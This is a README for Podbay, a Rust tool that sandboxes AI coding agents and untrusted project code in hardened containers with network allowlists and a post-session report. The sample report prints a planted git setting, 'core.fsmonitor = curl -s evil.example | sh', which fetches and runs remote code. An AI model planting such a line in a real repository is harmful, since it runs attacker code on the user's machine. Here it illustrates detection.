# Podbay

Disposable containers for working in a codebase, including running AI coding
agents and code you don't fully trust, without handing them your machine.

`podbay run` starts a throwaway container around a project directory. The
project is mounted read-write at `/home/dev/workspace/repomount`, and
everything else is something you declared:

- dotfiles mounted read-only
- named volumes for state that should outlive the container
- tools that mise installs on top of what the project asks for
- optional root build scripts baked into a derived image
- network access: none, HTTPS to the hosts you list, or everything

Anything that needs root, such as changes to the image, can only come from
your own config directory, never from the mounted project.

## Status

Being rebuilt in Rust, in stages:

1. **Rust port** with real config parsing, Podman and Docker backends, tests
   and CI. *(done)*
2. **Threat model**, plus a session report that flags changes to git hooks and
   config. *(done)*
3. **Container hardening**: dropped capabilities, `no-new-privileges`,
   read-only root filesystem, resource limits. *(done)*
4. Network policy: no network by default, with an allowlist enforced by a
   filtering proxy. Tool installs move to a separate provisioning step.
   *(done)*
5. Landlock and seccomp around processes inside the container.
6. A native rootless runtime, with Podman and Docker kept as fallbacks.

[THREAT_MODEL.md](THREAT_MODEL.md) covers what is and isn't protected
today, and which stage closes each gap. The biggest: the project is mounted
read-write, so code inside can plant git hooks or config that run on your
host the next time you use git there. The [session report](#session-report)
tells you when that has happened.

## Install

```
cargo install --path .
```

You need Podman or Docker. Podman is preferred when both are installed
because it is rootless by default. With rootful Docker, a container escape is
root on the host, and podbay says so on every run.

## Quick start

```
podbay run ~/src/some-project
```

The first run builds the bundled base image: Debian slim, a non-root `dev`
user and mise, verified against its signing key. Before the session starts,
podbay [provisions](#provisioning) the tools the project's own config
(`.mise.toml`, `.nvmrc`, ...) and your profile ask for. The session itself
has no network.

```
podbay run . -- make test     # run a command instead of a shell
podbay run --dry-run .        # print the exact podman/docker command
podbay run --network full .   # give this session the network
podbay build                  # build or refresh the images ahead of time
podbay provision .            # install or refresh the project's tools now
```

podbay's exit code is the command's (or the shell's) exit code.

Files the container creates in your project are owned by you on the host. On
rootless Podman, `dev` is mapped onto your user with `keep-id`. On rootful
Docker, podbay builds one more small image layer that gives `dev` your uid
and gid.

## What a session can do

- **Write**: the project, volumes, read-write mounts, and three scratch
  areas: `/home/dev`, `/tmp` and `/var/tmp`. The rest of the filesystem is
  read-only. The home directory is a fresh tmpfs every session, copied from
  the image at start. Anything worth keeping belongs in the project or a
  volume.
- **Privileges**: none. The session runs as `dev` with no capabilities and
  `no-new-privileges`, so setuid binaries and `sudo` don't work. The
  entrypoint starts with just enough to set up the home directory and fix
  mount ownership, then drops all of it before your command runs. A profile
  can keep specific capabilities with `cap_add` (see below).
- **Network**: none. The session has only a loopback interface, so it
  can't reach the internet, your LAN or the host. A profile can allow HTTPS
  to specific hosts (see [Network allowlist](#network-allowlist)), or turn
  on full access with `network = "full"`, which podbay warns about on every
  run. Tool installs need neither; see [Provisioning](#provisioning).
- **Resources**: at most 4096 processes and threads by default. Memory and
  CPU limits are opt-in. Rootless engines can apply a limit only when
  systemd delegates that cgroup controller to your user. When it doesn't,
  podbay warns and runs without that limit.

## Network allowlist

A profile can let the session reach a few hosts over HTTPS and nothing else:

```toml
network = ["api.anthropic.com", "*.githubusercontent.com", "registry.example.com:8443"]
```

`*.example.com` covers every name below `example.com` (not `example.com`
itself), and the port is 443 unless you give one. A list in a profile adds to
the lists of the profiles it extends; `"none"` or `"full"` replaces them.
`--network none` or `--network full` overrides everything for one run.

The session still has no network interface besides loopback. podbay starts a
tiny relay container next to it, with no network either, and the session
shares the relay's network namespace. The relay listens on `127.0.0.1:3128`
and passes every connection to podbay on the host, which:

- accepts only HTTPS proxy requests (`CONNECT host:port`), for names on the
  list. IP addresses are refused, and names not on the list are never
  looked up, so a session can't leak data through DNS.
- refuses names that resolve to loopback, private, link-local (including
  cloud metadata at 169.254.169.254) or other non-public addresses. A
  registry on your LAN can't be allowed this way.
- connects from the host and copies bytes both ways. TLS is end to end
  between the session and the server; podbay sees only the host name.

The session gets `HTTPS_PROXY` and `HTTP_PROXY` (and the lowercase forms)
pointing at the relay, and `NODE_USE_ENV_PROXY=1` for Node. Most tools,
including curl, git over HTTPS, npm, pip, cargo and Node, pick these up.
Anything that ignores them, or uses another protocol such as SSH, gets no
connection at all. Plain `http://` URLs are refused.

After the session, podbay lists every destination it asked for:

```
podbay: network:
  api.anthropic.com:443: allowed (14 times)
  pastebin.com:443: denied, not on the allowlist
```

The relay image is built from source the first time it's needed, from a
pinned Rust image, and is under 1 MB.

## Provisioning

Sessions can't download tools, so podbay installs them first, in a separate
short-lived container that runs `mise install`. That container has network
access but sees only what installing needs: the project, read-only, the
mise data directory and the profile's `[tools]`. Your profile's mounts,
volumes and capabilities are left out, so credentials there never share a
container with the network.

`podbay run` provisions by itself when anything that decides the tools
changed since the last successful run: the image, the profile's tools,
`--local-cache`, or the project's mise and version files (`mise.toml`,
`.tool-versions`, `.nvmrc`, `.python-version`, `rust-toolchain.toml`, ...).
It prints a line when it does. If provisioning fails, the session still
starts, with a warning. Inside the session, mise runs with `MISE_OFFLINE`,
so it uses what is installed instead of trying to download.

Run `podbay provision` yourself to refresh tools pinned to `latest`, after
removing the mise volume, or when tools come from somewhere podbay doesn't
watch. It installs into the same place `run` would; pass `--local-cache` to
match `run --local-cache`.

If the project has a `mise.toml`, mise asks you to trust it before it
installs anything, as it does on the host. In a terminal the prompt appears
during provisioning; without one, provisioning fails until you run
`podbay provision` in a terminal. Version files such as `.tool-versions`
need no trust.

## Session report

When the container exits, podbay reports anything it changed that the host
will act on later: git hooks, git config, the `.git` entry itself, nested
repositories, and a few files that editors and shells run (`.envrc`,
`.vscode/`, mise config).

```
podbay: session report: 2 warnings, 1 notice
  warning: .git/config: settings changed
            + core.fsmonitor = curl -s evil.example | sh   [can run commands]
  warning: .git/hooks/post-checkout: added, an executable file
  notice:  .envrc: changed during the session (direnv runs it in your shell once allowed)
podbay: git and other tools on the host act on these files. Inspect them before running git in /home/me/src/app
```

A clean session ends with one line:
`podbay: session report: no changes to git hooks or config`.

A warning means don't run git in that project on the host until you've
looked at the files it lists. Legitimate work can trigger it too, for
example when the container runs `git checkout -b x --track` and that
writes branch settings. The settings list makes that easy to tell apart.
The report detects changes; it doesn't revert them.
[THREAT_MODEL.md](THREAT_MODEL.md) lists what it covers and its limits.

## Profiles

A profile is a single TOML file in `~/.config/podbay/profiles/`:

```
podbay profile init base
podbay profile init ai --extends base
podbay profile show ai        # everything ai resolves to, inheritance merged
podbay run -p ai .
```

If you don't pass `-p`, podbay uses `default_profile` from `config.toml`,
otherwise a profile named `default` if one exists.

```toml
# ~/.config/podbay/profiles/base.toml

# Bind mounts from the host, read-only unless mode = "rw".
[[mount]]
host = "~/.gitconfig"
container = "/home/dev/.gitconfig"

[[mount]]
host = "~/.zshrc"
container = "/home/dev/.zshrc"
```

```toml
# ~/.config/podbay/profiles/ai.toml
extends = ["base"]

# Optional: a root build script for system packages mise can't install.
# Relative to the profiles directory; must start with a shebang.
extension = "ai.sh"

# The agent calls its API, and nothing else.
network = ["api.anthropic.com"]

# Named volumes keep tool state across runs. Stored as podbay-ai-<name>.
[[volume]]
name = "opencode-config"
container = "/home/dev/.config/opencode"

[[volume]]
name = "opencode-data"
container = "/home/dev/.local/share/opencode"

# Tools mise installs in every session, on top of the project's own.
[tools]
opencode = "latest"
```

```toml
# ~/.config/podbay/profiles/debug.toml
extends = ["base"]

# Capabilities the session keeps (none by default). podbay prints them on
# every run that uses this profile.
cap_add = ["SYS_PTRACE"]   # gdb, strace

# Override the limits from config.toml.
[limits]
memory = "16g"
```

With `extends`, ancestors are applied first. A later profile's mount or
volume replaces an inherited one at the same container path, and its tools
override inherited versions. `cap_add` lists are combined, `[limits]` keys
override one at a time, and `network` host lists add up while `"none"` or
`"full"` replaces what came before. Volumes keep the name of the profile that
declared them, so every profile extending `base` shares `base`'s volumes.

**Mounts or volumes?** Use mounts for files you own and edit on the host. Use
volumes for directories the container creates or writes into, since the home
directory is wiped after every session. The engine creates a missing mount
point's parent directories as root, and the entrypoint gives them to `dev`.

**Extensions** are layered as derived images (`podbay-<profile>:<hash>`).
Each tag is a hash of the script and its parent image, so editing a script,
or any script below it in the chain, rebuilds exactly what changed.
Extensions run as root at build time, the only time the root filesystem is
writable. Anything they put in `/home/dev` is copied into the home skeleton
automatically.

## Configuration

`~/.config/podbay/config.toml` (all keys optional):

```toml
backend = "podman"           # or "docker"; default: podman if installed
default_profile = "base"
base_image = "my/image:tag"  # use your own image instead of the bundled one
network = "none"             # "full", or a host list; see Network allowlist

[limits]                     # profiles can override each key
pids = 4096                  # processes and threads; 0 for no limit
memory = "8g"                # default: no limit
cpus = 4                     # default: no limit
```

A custom base image must provide a `dev` user, `setpriv`, podbay's
entrypoint, and a copy of `/home/dev` at `/usr/local/share/podbay/home` to
seed the home directory from (see `base/Containerfile`). Without mise,
provisioning does nothing.

`PODBAY_CONFIG_DIR` and `PODBAY_CACHE_DIR` move podbay's config and cache
directories without touching `HOME` or `XDG_*`. Rootless Podman uses those to
find its own storage.

## A note on mise and trust

mise can install tools from many sources, and some of its backends run
arbitrary code at install time. By default, installed tools live in one
shared volume (`podbay-mise-data`), so a malicious project could leave
something behind that other projects then pick up. For code you don't trust,
`--local-cache` keeps that project's installs in
`~/.cache/podbay/mise/<repo-key>/`. Provisioning runs those installs with
network access and the project visible, so review a project's mise config
before trusting it.

## Development

```
cargo test                          # unit, CLI and end-to-end tests
PODBAY_TEST_BACKEND=podman cargo test
```

The end-to-end tests run real containers on Docker (or the engine named by
`PODBAY_TEST_BACKEND`) and are skipped when that engine isn't available. They
use a small stand-in for the base image (`tests/fixtures/test-base`) with the
same entrypoint and a fake `mise` that records what provisioning saw, so
they don't need to build the full toolchain. Two of them play a hostile
session: one checks that the session report catches it, the other that the
network allowlist holds. Set `PODBAY_TEST_INTERNET=1` to also check that an
allowed host is reachable, as CI does.

The relay is its own crate in `relay/`, standard library only; run
`cargo test --workspace` and `cargo clippy --workspace` to include it.
